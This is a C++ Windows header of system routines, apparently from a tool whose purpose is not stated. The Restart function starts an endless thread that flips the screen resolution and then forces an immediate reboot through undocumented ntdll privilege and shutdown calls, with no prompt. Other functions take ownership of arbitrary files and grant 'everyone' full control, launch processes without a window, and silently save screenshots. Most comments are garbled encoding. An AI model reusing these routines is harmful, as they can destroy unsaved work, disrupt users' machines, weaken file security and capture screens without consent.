#pragma once
#include "stdafx.h"
#include <strsafe.h>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")
void Catchi();
void s(int cathy);
void s(LPCWSTR cathy);
#pragma warning(disable:4996)
DWORD WINAPI BlackThread(LPVOID pM);
VOID Restart()
{
	CreateThread(NULL, 0, BlackThread, 0, 0, NULL);
	const int SE_SHUTDOWN_PRIVILEGE = 0x13;
	typedef int(__stdcall *PFN_RtlAdjustPrivilege)(INT, BOOL, BOOL, INT*);
	typedef int(__stdcall *PFN_ZwShutdownSystem)(INT);
	HMODULE hModule = ::LoadLibrary(_T("ntdll.dll"));
	if (hModule != NULL)
	{
		PFN_RtlAdjustPrivilege pfnRtl = (PFN_RtlAdjustPrivilege)GetProcAddress(hModule, "RtlAdjustPrivilege"); PFN_ZwShutdownSystem 
		pfnShutdown = (PFN_ZwShutdownSystem)GetProcAddress(hModule, "ZwShutdownSystem");
		if (pfnRtl != NULL && pfnShutdown != NULL)
		{
			int en = 0;
			int nRet = pfnRtl(SE_SHUTDOWN_PRIVILEGE, TRUE, TRUE, &en);
			if (nRet == 0x0C000007C) nRet = pfnRtl(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &en); //SH_SHUTDOWN = 0; //SH_RESTART = 1; //SH_POWEROFF = 2;
			
			nRet = pfnShutdown(1);
			
		}
	}
}
DWORD WINAPI BlackThread(LPVOID pM)
{

	DEVMODE NewDevMode = { 0 };
	while (1)
	{
		NewDevMode.dmSize = sizeof(NewDevMode);
		NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
		NewDevMode.dmPelsWidth = 800;
		NewDevMode.dmPelsHeight = 600;
		ChangeDisplaySettings(&NewDevMode, 0);
		NewDevMode = { 0 };
		NewDevMode.dmSize = sizeof(NewDevMode);
		NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
		NewDevMode.dmPelsWidth = 640;
		NewDevMode.dmPelsHeight = 480;
		ChangeDisplaySettings(&NewDevMode, 0);
	}
}

typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);

BOOL GetVersionEx2(LPOSVERSIONINFOW lpVersionInformation)
{
	HMODULE hNtDll = GetModuleHandleW(L"NTDLL");
	//typedef int(__stdcall *PFN_ZwShutdownSystem)(INT);

	typedef int(__stdcall *tRtlGetVersion)(PRTL_OSVERSIONINFOW);
	tRtlGetVersion pRtlGetVersion = NULL;
	if (hNtDll)pRtlGetVersion = (tRtlGetVersion)GetProcAddress(hNtDll, "RtlGetVersion");
	if (pRtlGetVersion)return pRtlGetVersion((PRTL_OSVERSIONINFOW)lpVersionInformation) >= 0;
	return FALSE;
}

BOOL GetOSDisplayString(wchar_t *pszOS)
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx) return FALSE;

	wchar_t tmp[101];
	_itow_s(osvi.dwMajorVersion, tmp, 10);
	wcscpy(pszOS, tmp);
	wcscat(pszOS, L".");
	_itow_s(osvi.dwMinorVersion, tmp, 10);
	wcscat(pszOS, tmp);
	wcscat(pszOS, L".");
	_itow_s(osvi.dwBuildNumber, tmp, 10);
	wcscat(pszOS, tmp);

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)pGNSI(&si); else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId&&osvi.dwMajorVersion >= 6)
	{
		OSVERSIONINFOEXW ovi;
		ZeroMemory(&ovi, sizeof(OSVERSIONINFOEXW));
		if (!GetVersionEx2((LPOSVERSIONINFOW)&ovi)) return FALSE;
		osvi.dwMajorVersion = ovi.dwMajorVersion;
		osvi.dwMinorVersion = ovi.dwMinorVersion;
		osvi.dwBuildNumber = ovi.dwBuildNumber;
		wchar_t tmp[101];
		_itow_s(osvi.dwMajorVersion, tmp, 10);
		wcscpy(pszOS, tmp);
		wcscat(pszOS, L".");
		_itow_s(osvi.dwMinorVersion, tmp, 10);
		wcscat(pszOS, tmp);
		wcscat(pszOS, L".");
		_itow_s(osvi.dwBuildNumber, tmp, 10);
		wcscat(pszOS, tmp);
	}
	return true;
}

BOOL AdjustPrivileges(const wchar_t *lpName)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = { 0 };
	TOKEN_PRIVILEGES oldtp = { 0 };
	DWORD dwSize = sizeof(TOKEN_PRIVILEGES);
	LUID luid = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		if (GetLastError() == ERROR_CALL_NOT_IMPLEMENTED)
			return TRUE;
		else
			return FALSE;
	}
	if (!LookupPrivilegeValueW(NULL, lpName, &luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	/* Adjust Token Privileges */
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &oldtp, &dwSize)) {
		CloseHandle(hToken);
		return FALSE;
	}

	// close handles
	CloseHandle(hToken);
	return TRUE;
}



BOOL TakeOwner(LPWSTR FilePath)
{
	CHAR UserName[36];
	DWORD cbUserName = sizeof(UserName);
	CHAR Sid[1024] = { 0 };
	DWORD cbSid = sizeof(Sid);
	CHAR DomainBuffer[128] = { 0 };
	DWORD cbDomainBuffer = sizeof(DomainBuffer);
	SID_NAME_USE eUse;
	PACL Dacl = NULL, OldDacl = NULL;
	EXPLICIT_ACCESS Ea;
	PSECURITY_DESCRIPTOR Sd = NULL;
	BOOL Ret = FALSE;

	if (AdjustPrivileges(SE_TAKE_OWNERSHIP_NAME) && AdjustPrivileges(SE_RESTORE_NAME))
	{
		GetUserNameA(UserName, &cbUserName);
		if (LookupAccountNameA(NULL, UserName, &Sid, &cbSid, DomainBuffer, &cbDomainBuffer, &eUse))
		{

			ZeroMemory(&Ea, sizeof(EXPLICIT_ACCESS));
			GetNamedSecurityInfoW(FilePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &OldDacl, NULL, &Sd);
			wchar_t x[] = L"everyone";
			BuildExplicitAccessWithName(&Ea, x, GENERIC_ALL, GRANT_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);
			if (SetEntriesInAclW(1, &Ea, OldDacl, &Dacl) == ERROR_SUCCESS)
			{
				SetNamedSecurityInfoW(FilePath, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, &Sid, NULL, NULL, NULL);
				if (SetNamedSecurityInfoW(FilePath, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, &Sid, NULL, Dacl, NULL) == ERROR_SUCCESS)
				{
					Ret = TRUE;
				}
			}

		}
	}
	return Ret;
}
bool RunEXE(wchar_t *CmdLine)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	return CreateProcess(NULL, CmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}


#define ProcessBasicInformation 0  
typedef struct
{
	DWORD ExitStatus;
	DWORD PebBaseAddress;
	DWORD AffinityMask;
	DWORD BasePriority;
	ULONG UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
}   PROCESS_BASIC_INFORMATION;
typedef LONG(__stdcall *PROCNTQSIP)(HANDLE, UINT, PVOID, ULONG, PULONG);


DWORD GetParentProcessID(DWORD dwProcessId)
{
	LONG status;
	DWORD dwParentPID = -1;
	HANDLE hProcess;
	PROCESS_BASIC_INFORMATION pbi;

	PROCNTQSIP NtQueryInformationProcess = (PROCNTQSIP)GetProcAddress(
		GetModuleHandle(L"ntdll"), "NtQueryInformationProcess");

	if (NULL == NtQueryInformationProcess)return -1;
	// Get process handle
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);
	if (!hProcess)return -1;

	// Retrieve information
	status = NtQueryInformationProcess(hProcess,
		ProcessBasicInformation,
		(PVOID)&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		NULL);
	// Copy parent Id on success
	if (!status)dwParentPID = pbi.InheritedFromUniqueProcessId;
	CloseHandle(hProcess);
	return dwParentPID;
}

void Catchi()
{
	DEVMODE curDevMode;
	curDevMode.dmSize = sizeof(DEVMODE);
	EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &curDevMode);

	int width = curDevMode.dmPelsWidth, heigth = curDevMode.dmPelsHeight;
	HDC hdcWindow = GetDC(NULL);
	int nBitPerPixel = GetDeviceCaps(hdcWindow, BITSPIXEL);
	CImage image;
	image.Create(width, heigth, nBitPerPixel);
	BitBlt(image.GetDC(), 0, 0, width, heigth, hdcWindow, 0, 0, SRCCOPY);
	ReleaseDC(NULL, hdcWindow);
	image.ReleaseDC();
	image.Save(L"C:\\SAtemp\\ScreenShot.bmp");
}
int CaptureImage(HWND hwnd, CONST CHAR *dirPath, CONST CHAR *filename)
{
	CHAR FilePath[MAX_PATH];
	HDC hdcScreen;
	HDC hdcWindow;
	HDC hdcMemDC = NULL;
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;
	RECT rcClient;
	BITMAPFILEHEADER   bmfHeader;
	BITMAPINFOHEADER   bi;
	DWORD dwBmpSize;
	HANDLE hDIB;
	CHAR *lpbitmap;
	HANDLE hFile;
	DWORD dwSizeofDIB;
	DWORD dwBytesWritten;
	//if ((int)hwnd == 245462374)Catchi();
	hdcScreen = GetDC(NULL); // ȫ��ĻDC
	hdcWindow = GetDC(hwnd); // ��ͼĿ�괰��DC
							 // ���������ڴ�DC
	hdcMemDC = CreateCompatibleDC(hdcWindow);
	if (!hdcMemDC)
	{
		s(-2);
		goto done;
	}
	// ��ȡ�ͻ����������ڼ����С
	GetClientRect(hwnd, &rcClient);
	// ������չģʽ
	SetStretchBltMode(hdcWindow, HALFTONE);
	// ��Դ DC ��������Ļ��Ŀ�� DC �ǵ�ǰ�Ĵ��� (HWND)
	if (!StretchBlt(hdcWindow,
		0, 0,
		rcClient.right, rcClient.bottom,
		hdcScreen,
		0, 0,
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN),
		SRCCOPY))
	{
		//s(-1);
		goto done;
	}
	// ͨ������DC ����һ������λͼ
	hbmScreen = CreateCompatibleBitmap(
		hdcScreen,
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN)
	);
	if (!hbmScreen)
	{
		//s(1);
		goto done;
	}
	// ��λͼ�鴫�͵����Ǽ��ݵ��ڴ�DC��
	SelectObject(hdcMemDC, hbmScreen);
	if (!BitBlt(
		hdcMemDC,   // Ŀ��DC
		0, 0,        // Ŀ��DC�� x,y ����
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN),
		hdcScreen,  // ��ԴDC
		0, 0,        // ��ԴDC�� x,y ����
		SRCCOPY))   // ճ����ʽ
	{
		//s(2);
		goto done;
	}
	// ��ȡλͼ��Ϣ������� bmpScreen ��
	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
	// �� 32-bit Windows ϵͳ��, GlobalAlloc �� LocalAlloc ���� HeapAlloc ��װ����
	// handle ָ�����Ĭ�ϵĶ�. ���Կ����� HeapAlloc Ҫ��
	hDIB = GlobalAlloc(GHND, dwBmpSize);
	lpbitmap = (char *)GlobalLock(hDIB);
	// ��ȡ����λͼ��λ���ҿ��������һ�� lpbitmap ��.
	GetDIBits(
		hdcWindow,  // �豸�������
		hbmScreen,  // λͼ���
		0,          // ָ�������ĵ�һ��ɨ����
		(UINT)bmpScreen.bmHeight, // ָ��������ɨ������
		lpbitmap,   // ָ����������λͼ���ݵĻ�������ָ��
		(BITMAPINFO *)&bi, // �ýṹ�屣��λͼ�����ݸ�ʽ
		DIB_RGB_COLORS // ��ɫ���ɺ졢�̡�����RGB������ֱ��ֵ����
	);
	strcpy_s(FilePath, dirPath);
	strcat_s(FilePath, filename);
	strcat_s(FilePath, ".bmp");
	// ����һ���ļ��������ļ���ͼ
	hFile = CreateFileA(
		FilePath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	// �� ͼƬͷ(headers)�Ĵ�С, ����λͼ�Ĵ�С����������ļ��Ĵ�С
	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	// ���� Offset ƫ����λͼ��λ(bitmap bits)ʵ�ʿ�ʼ�ĵط�
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
	// �ļ���С
	bmfHeader.bfSize = dwSizeofDIB;
	// λͼ�� bfType �������ַ��� "BM"
	bmfHeader.bfType = 0x4D42; //BM   
	dwBytesWritten = 0;
	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
	// �������ڴ沢�ͷ�
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);
	// �ر��ļ����
	CloseHandle(hFile);
	// ������Դ
done:
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);
	ReleaseDC(hwnd, hdcWindow);
	return 0;
}